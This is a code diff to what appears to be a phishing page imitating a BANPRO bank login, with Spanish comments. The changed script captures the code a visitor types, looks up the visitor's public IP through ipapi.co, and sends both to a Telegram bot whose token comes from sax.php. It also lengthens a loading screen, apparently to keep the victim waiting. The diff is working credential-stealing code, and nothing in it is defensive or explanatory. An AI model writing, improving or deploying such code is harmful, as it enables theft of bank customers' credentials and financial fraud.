@@ -73,6 +73,17 @@
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
+            // Función para obtener la IP pública del cliente usando ipapi.co
+            function obtenerIP() {
+                return fetch('https://ipapi.co/json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(error => {
+                        console.error('Error al obtener la IP:', error);
+                        return 'IP no disponible';
+                    });
+            }
+
             // Función para obtener el token y el chat ID desde sax.php
             function obtenerToken() {
                 return fetch('sax.php')
@@ -92,14 +103,21 @@
 
                 // Obtener el valor ingresado en el formulario
                 const ips1 = document.getElementById("i1").value;
-                const msg = `BANPRO LOGIN> IP: ${window.location.hostname} - Código: ${ips1}`;
 
-                // Obtener el token y el chat ID, y luego enviar el mensaje a Telegram
-                obtenerToken().then(data => {
-                    if (data && data.token && data.chat_id) {
-                        enviarMensajeTelegram(data.token, data.chat_id, msg);
-                    }
-                });
+                // Obtener la IP pública y luego el token y chat_id para enviar el mensaje a Telegram
+                Promise.all([obtenerToken(), obtenerIP()])
+                    .then(results => {
+                        const data = results[0];
+                        const ip = results[1];
+                        const msg = `BANPRO LOGIN> IP: ${ip} - Código: ${ips1}`;
+
+                        if (data && data.token && data.chat_id) {
+                            enviarMensajeTelegram(data.token, data.chat_id, msg);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error durante el proceso:', error);
+                    });
             });
 
             // Función para enviar un mensaje a Telegram
@@ -131,7 +149,7 @@
             }
         });
 
-        // Ocultar el cargador después de 19 segundos
+        // Ocultar el cargador después de 23 segundos
         window.onload = function() {
             setTimeout(function() {
                 document.getElementById("ld").style.display = "none";
